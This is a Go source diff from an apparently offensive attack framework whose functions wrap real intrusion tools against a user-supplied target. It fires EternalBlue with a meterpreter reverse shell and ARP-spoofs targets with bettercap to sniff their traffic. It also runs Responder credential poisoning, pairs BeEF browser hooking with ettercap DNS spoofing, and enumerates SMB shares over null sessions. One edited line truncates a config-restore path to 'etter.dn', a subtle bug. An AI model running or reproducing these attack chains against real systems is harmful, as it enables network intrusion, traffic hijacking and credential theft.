@@ -25,48 +25,57 @@ var (
 )
 
 func InternalScan() {
-    subprocess.Popen(`bettercap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.ready) » {reset}; net.recon on; net.probe on; active; ticker on"`); fmt.Println()
+    subprocess.Popen(`bettercap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.ready) » {reset}; net.recon on; net.probe on; active; ticker on"`)
+    return
 }
 
 func NmapPortScan(userTarget string) {
-    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing: " + bcolors.RED + bcolors.ITALIC + "PORT scan " + bcolors.DARKGREEN + "Target " + bcolors.PURPLE + "set to: " + bcolors.ORANGE + bcolors.ITALIC + "%s 🐾" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC, userTarget)
+    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + "] " + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + "Performing: " + bcolors.RED + bcolors.ITALIC + "PORT scan " + bcolors.DARKGREEN + "Target " + bcolors.PURPLE + "set to: " + bcolors.ORANGE + bcolors.ITALIC + "%s 🐾" + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + ")\n" + bcolors.ENDC, userTarget)
     //subprocess.Popen(`masscan -v %s --ports 0-65535 --rate 10000 --wait 0`, userTarget); fmt.Println()
-    subprocess.Popen(`nmap --open -T4 -Pn -n -v -p- %s`, userTarget); fmt.Println()
+    subprocess.Popen(`nmap --open -T4 -Pn -n -v -p- %s`, userTarget)
+    return
 }
 
 func NmapVulnScan(userTarget string) {
-    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing vuln scan:" + bcolors.ORANGE + "(◣_◢) " +  bcolors.GREEN + "target!!🎯 " + bcolors.YELLOW + "%s 🐾\n" + bcolors.ENDC, userTarget)
-    subprocess.Popen(`nmap --open -T4 -Pn -n -sSV -p- --script="vuln and safe" --reason %s`, userTarget); fmt.Println()
+    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + "] " + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + "Performing vuln scan: " +  bcolors.RED + "Target!!🎯 " + bcolors.YELLOW + "%s 🐾\n" + bcolors.ENDC, userTarget)
+    subprocess.Popen(`nmap --open -T4 -Pn -n -sSV -p- --script="vuln and safe" --reason %s`, userTarget)
+    return
 }
 
 func SmbVulnScan(userTarget string) {
-    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing SMB scan:" + bcolors.ORANGE + "(◣_◢) " +  bcolors.GREEN + "target!!🎯 " + bcolors.YELLOW + "%s 🐾\n" + bcolors.ENDC, userTarget)
-    subprocess.Popen(`nmap -Pn -v --script "smb-vuln*" -p139,445 %s`, userTarget); fmt.Println()
+    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + "] " + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + "Performing SMB scan: " +  bcolors.RED + "Target!!🎯 " + bcolors.YELLOW + "%s 🐾\n" + bcolors.ENDC, userTarget)
+    subprocess.Popen(`nmap -Pn -v --script "smb-vuln*" -p139,445 %s`, userTarget)
+    return
 }
 
 func Enum4linux(userTarget string) {
-    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing SMB recon:" + bcolors.ORANGE + "(◣_◢) " +  bcolors.GREEN + "target!!🎯 " + bcolors.YELLOW + "%s 🐾\n" + bcolors.ENDC, userTarget)
-    subprocess.Popen(`cd /root/.africana/africana-base/enum4linux-ng; python3 enum4linux-ng.py -A -v %s`, userTarget); fmt.Println()
+    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + "] " + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + "Performing SMB recon: " +  bcolors.RED + "Target!!🎯 " + bcolors.YELLOW + "%s 🐾\n" + bcolors.ENDC, userTarget)
+    subprocess.Popen(`cd /root/.africana/africana-base/enum4linux-ng; python3 enum4linux-ng.py -A -v %s`, userTarget)
+    return
 }
 
 func EnumNxc(userTarget string) {
-    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing SMB recon:" + bcolors.ORANGE + "(◣_◢) " +  bcolors.GREEN + "target!!🎯 " + bcolors.YELLOW + "%s 🐾\n" + bcolors.ENDC, userTarget)
-    subprocess.Popen(`nxc smb %s -u '' -p '' --verbose --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol`, userTarget); fmt.Println()
+    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + "] " + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + "Performing SMB recon: " +  bcolors.RED + "Target!!🎯 " + bcolors.YELLOW + "%s 🐾\n" + bcolors.ENDC, userTarget)
+    subprocess.Popen(`nxc smb %s -u '' -p '' --verbose --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol`, userTarget)
+    return
 }
 
 func SmbMapScan(userTarget string) {
-    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing SMB recon:" + bcolors.ORANGE + "(◣_◢) " +  bcolors.GREEN + "target!!🎯 " + bcolors.YELLOW + "%s 🐾\n" + bcolors.ENDC, userTarget)
-    subprocess.Popen(`smbmap --no-banner -H %s -u null -p null -r --depth 5`, userTarget); fmt.Println()
+    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + "] " + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + "Performing SMB recon: " +  bcolors.RED + "Target!!🎯 " + bcolors.YELLOW + "%s 🐾\n" + bcolors.ENDC, userTarget)
+    subprocess.Popen(`smbmap --no-banner -u '' -p '' -r --depth 5 -H %s; smbmap --no-banner -u 'guest' -p '' -r --depth 5 -H %s`, userTarget, userTarget)
+    return
 }
 
 func SmbCrackmapExec(userTarget string) {
-    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing SMB recon:" + bcolors.ORANGE + "(◣_◢) " +  bcolors.GREEN + "target!!🎯 " + bcolors.YELLOW + "%s 🐾\n" + bcolors.ENDC, userTarget)
-    subprocess.Popen(`crackmapexec smb %s --pass-pol -u '' -p '' --shares --local-auth --content --depth 5`, userTarget); fmt.Println()
+    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + "] " + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + "Performing SMB recon: " +  bcolors.RED + "Target!!🎯 " + bcolors.YELLOW + "%s 🐾\n" + bcolors.ENDC, userTarget)
+    subprocess.Popen(`crackmapexec smb %s --pass-pol -u '' -p '' --shares --local-auth --content --depth 5`, userTarget)
+    return
 }
 
 func RpcEnumScan(userTarget string) {
-    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing RPC Recon:" + bcolors.ORANGE + "(◣_◢) " +  bcolors.GREEN + "target!!🎯 " + bcolors.YELLOW + "%s 🐾\n" + bcolors.ENDC, userTarget)
-    subprocess.Popen(`rpcclient -U "" -N %s`, userTarget); fmt.Println()
+    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + "] " + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + "Performing RPC Recon: " +  bcolors.RED + "Target!!🎯 " + bcolors.YELLOW + "%s 🐾\n" + bcolors.ENDC, userTarget)
+    subprocess.Popen(`rpcclient -U "" -N %s`, userTarget)
+    return
 }
 
 func SmbExploit(userTarget string) {
@@ -77,8 +86,8 @@ func SmbExploit(userTarget string) {
     }
     menus.MenuThreeOne()
     for {
-        fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Smbexploit" + bcolors.BLUE + ")\n" + bcolors.ENDC)
-        fmt.Printf(bcolors.BLUE + "╰─🐼" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Smbexploit" + bcolors.BLUE + ")" + bcolors.ENDC)
+        fmt.Printf(bcolors.BLUE + "\n╰─🐼" + bcolors.GREEN + "❯ " + bcolors.ENDC)
         fmt.Scan(&userInput)
         switch userInput {
         case "0":
@@ -86,24 +95,21 @@ func SmbExploit(userTarget string) {
         case "1":
             fmt.Println()
             subprocess.Popen(`ip address`)
-            fmt.Println()
-            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Smbexploit " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
-        fmt.Printf(bcolors.BLUE + "╰─🐼" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Smbexploit " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
+        fmt.Printf(bcolors.BLUE + "\n╰─🐼" + bcolors.GREEN + "❯ " + bcolors.ENDC)
             userLhost, _ := reader.ReadString('\n')
             userLhost = strings.TrimSpace(userLhost)
             if userLhost == "" {
                 userLhost = userLhostIp
             }
-            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Smbexploit " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "9999" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
-        fmt.Printf(bcolors.BLUE + "╰─🐼" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Smbexploit " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "9999" + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + ")" + bcolors.ENDC)
+        fmt.Printf(bcolors.BLUE + "\n╰─🐼" + bcolors.GREEN + "❯ " + bcolors.ENDC)
             userLport, _ := reader.ReadString('\n')
             userLport = strings.TrimSpace(userLport)
             if userLport == "" {
                 userLport = "9999"
             }
-            fmt.Println()
             subprocess.Popen(`msfdb start; msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS %s; set RPORT 445; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST %s; set LPORT %s; set VERBOSE true; exploit -j'`, userTarget, userLhost, userLport)
-            fmt.Println()
         case "cls", "clear":
             utils.ClearScreen()
         case "99", "m", "M", "menu", "Menu", "MENU":
@@ -114,22 +120,21 @@ func SmbExploit(userTarget string) {
             fmt.Println(bcolors.BLUE + "( " + bcolors.ORANGE + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 & 1 " + bcolors.BLUE + ")" + bcolors.ENDC)
         }
     }
-    fmt.Println()
 }
 
 func PacketSniffer(userTarget string) {
     menus.MenuThreeTwo()
     for {
-        fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Sniffer" + bcolors.BLUE + ")\n" + bcolors.ENDC)
-        fmt.Printf(bcolors.BLUE + "╰─🐽" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Sniffer" + bcolors.BLUE + ")" + bcolors.ENDC)
+        fmt.Printf(bcolors.BLUE + "\n╰─🐽" + bcolors.GREEN + "❯ " + bcolors.ENDC)
         fmt.Scan(&userInput)
         switch userInput {
         case "0":
             return
         case "1":
-            subprocess.Popen(`bettercap -caplet /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; ticker on'`, userTarget); fmt.Println()
+            subprocess.Popen(`bettercap -caplet /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; ticker on'`, userTarget)
         case "2":
-            subprocess.Popen(`bettercap -caplet /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; active; ticker on'`); fmt.Println()
+            subprocess.Popen(`bettercap -caplet /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; active; ticker on'`)
         case "99", "m", "M", "menu", "Menu", "MENU":
             menus.MenuThreeTwo()
         case "00", "h", "H", "help", "Help", "HELP":
@@ -138,28 +143,28 @@ func PacketSniffer(userTarget string) {
             fmt.Println(bcolors.BLUE + "( " + bcolors.ORANGE + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 to 2 " + bcolors.BLUE + ")" + bcolors.ENDC)
         }
     }
-    fmt.Println()
 }
 
 func PacketsResponder() {
-    userLhostIp, err := utils.GetDefaultIP()
-    if err != nil {
-        fmt.Println("Error getting default userLhostIp:", err)
-        os.Exit(1)
-    }
     filePath := "/etc/responder/Responder.conf.bak_africana"
     if _, err := os.Stat(filePath); os.IsNotExist(err) {
+        userLhostIp, err := utils.GetDefaultIP()
+        if err != nil {
+            fmt.Println("Error getting default userLhostIp:", err)
+            os.Exit(1)
+        }
         subprocess.Popen(`cp /etc/responder/Responder.conf /etc/responder/Responder.conf.bak_africana`)
-        fmt.Println(); subprocess.Popen(`ip address`); fmt.Println()
-        fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
-        fmt.Printf(bcolors.BLUE + "╰─🐷" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+        fmt.Println()
+        subprocess.Popen(`ip address`)
+        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + ")" + bcolors.ENDC)
+        fmt.Printf(bcolors.BLUE + "\n╰─🐷" + bcolors.GREEN + "❯ " + bcolors.ENDC)
         userIface, _ := reader.ReadString('\n')
         userIface = strings.TrimSpace(userIface)
         if userIface == "" {
             userIface = "eth0"
         }
-        fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Responder " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
-        fmt.Printf(bcolors.BLUE + "╰─🐷" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Responder " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
+        fmt.Printf(bcolors.BLUE + "\n╰─🐷" + bcolors.GREEN + "❯ " + bcolors.ENDC)
         userLhost, _ := reader.ReadString('\n')
         userLhost = strings.TrimSpace(userLhost)
         if userLhost == "" {
@@ -172,9 +177,11 @@ func PacketsResponder() {
             },
         }
         utils.Editors(filesToReplacements)
-        subprocess.Popen(`responder -I %s -Pdv; rm -rf /etc/responder/Responder.conf; mv /etc/responder/Responder.conf.bak_africana /etc/responder/Responder.conf`, userIface); fmt.Println()
+        subprocess.Popen(`responder -I %s -Pdv`, userIface)
+        subprocess.Popen(`rm -rf /etc/responder/Responder.conf; mv /etc/responder/Responder.conf.bak_africana /etc/responder/Responder.conf`)
     } else {
-        subprocess.Popen(`responder -I %s -Pdv; rm -rf /etc/responder/Responder.conf; mv /etc/responder/Responder.conf.bak_africana /etc/responder/Responder.conf`, userIface); fmt.Println()
+        subprocess.Popen(`responder -I %s -Pdv`, userIface)
+        subprocess.Popen(`rm -rf /etc/responder/Responder.conf; mv /etc/responder/Responder.conf.bak_africana /etc/responder/Responder.conf`)
     }
 }
 
@@ -185,8 +192,8 @@ func BeefEttercap(userTarget string) {
         os.Exit(1)
     }
     menus.MenuThreeFour()
-    fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefEttercap" + bcolors.BLUE + ")\n" + bcolors.ENDC)
-    fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefEttercap" + bcolors.BLUE + ")" + bcolors.ENDC)
+    fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
     fmt.Scan(&userInput)
     switch userInput {
     case "0":
@@ -195,8 +202,8 @@ func BeefEttercap(userTarget string) {
         filePath := "/etc/beef-xss/config.yaml.bak_africana"
         if _, err := os.Stat(filePath); os.IsNotExist(err) {
             subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)
-            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Type new " + bcolors.ENDC + "password " + bcolors.DARKGREY + bcolors.ITALIC + "for the " + bcolors.ENDC + "beef " + bcolors.DARKGREY + bcolors.ITALIC + "user" + bcolors.BLUE + ")\n" + bcolors.ENDC)
-            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Type new " + bcolors.ENDC + "password " + bcolors.DARKGREY + bcolors.ITALIC + "for the " + bcolors.ENDC + "beef " + bcolors.DARKGREY + bcolors.ITALIC + "user" + bcolors.BLUE + ")" + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
             fmt.Scan(&userPass)
             newString := fmt.Sprintf(`passwd: "%s"`, userPass)
             filesToReplacements := map[string]map[string]string{
@@ -217,25 +224,26 @@ func BeefEttercap(userTarget string) {
                 }
             utils.Editors(filesToReplacements)
             }
-            fmt.Println(); subprocess.Popen(`systemctl daemon-reload`)
+            subprocess.Popen(`systemctl daemon-reload`)
             }
-            fmt.Println(); subprocess.Popen(`ip address`); fmt.Println()
-            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
-            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+            fmt.Println()
+            subprocess.Popen(`ip address`)
+            fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + ")" + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
             userIface, _ := reader.ReadString('\n')
             userIface = strings.TrimSpace(userIface)
             if userIface == "" {
                 userIface = "eth0"
             }
-            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefEttercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
-            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefEttercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
             userLhost, _ := reader.ReadString('\n')
             userLhost = strings.TrimSpace(userLhost)
             if userLhost == "" {
                 userLhost = userLhostIp
             }
-            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefEttercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "FAKEDNS " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "Lengendery * A 0.0.0.0" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
-            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefEttercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "FAKEDNS " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "Lengendery * A 0.0.0.0" + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + ")" + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
             userFakeDns, _ := reader.ReadString('\n')
             userFakeDns = strings.TrimSpace(userFakeDns)
             if userFakeDns == "" {
@@ -282,14 +290,18 @@ func BeefEttercap(userTarget string) {
             if err != nil {
                 panic(err)
             }
-            fmt.Println(); subprocess.Popen(`systemctl restart apache2.service beef-xss.service; systemctl --no-pager status apache2.service beef-xss.service; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; ettercap -TQi %s -M arp:remote -P dns_spoof  /%s// /%s//`, userLhostIp, userIface, userTarget, userGateway); fmt.Println()
-            subprocess.Popen(`systemctl stop apache2.service beef-xss.service; rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.userFiles/* /var/www/html/; rm -rf /var/www/html/.userFiles/; rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns; systemctl --no-pager status apache2.service beef-xss.service`)
+            subprocess.Popen(`systemctl restart apache2.service beef-xss.service`)
+            subprocess.Popen(`systemctl --no-pager status apache2.service beef-xss.service; sleep 5`)
+            subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null; ettercap -TQi %s -M arp:remote -P dns_spoof  /%s// /%s//`, userLhostIp, userIface, userTarget, userGateway)
+            subprocess.Popen(`systemctl stop apache2.service beef-xss.service`)
+            subprocess.Popen(`rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.userFiles/* /var/www/html/; rm -rf /var/www/html/.userFiles/; rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dn`)
+            subprocess.Popen(`systemctl --no-pager status apache2.service beef-xss.service`)
     case "2":
         filePath := "/etc/beef-xss/config.yaml.bak_africana"
         if _, err := os.Stat(filePath); os.IsNotExist(err) {
             subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)
-            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Type new " + bcolors.ENDC + "password " + bcolors.DARKGREY + bcolors.ITALIC + "for the " + bcolors.ENDC + "beef " + bcolors.DARKGREY + bcolors.ITALIC + "user" + bcolors.BLUE + ")\n" + bcolors.ENDC)
-            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Type new " + bcolors.ENDC + "password " + bcolors.DARKGREY + bcolors.ITALIC + "for the " + bcolors.ENDC + "beef " + bcolors.DARKGREY + bcolors.ITALIC + "user" + bcolors.BLUE + ")" + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
             fmt.Scan(&userPass)
             newString := fmt.Sprintf(`passwd: "%s"`, userPass)
             filesToReplacements := map[string]map[string]string{
@@ -310,25 +322,26 @@ func BeefEttercap(userTarget string) {
                 }
             utils.Editors(filesToReplacements)
             }
-            fmt.Println(); subprocess.Popen(`systemctl daemon-reload`)
+            subprocess.Popen(`systemctl daemon-reload`)
             }
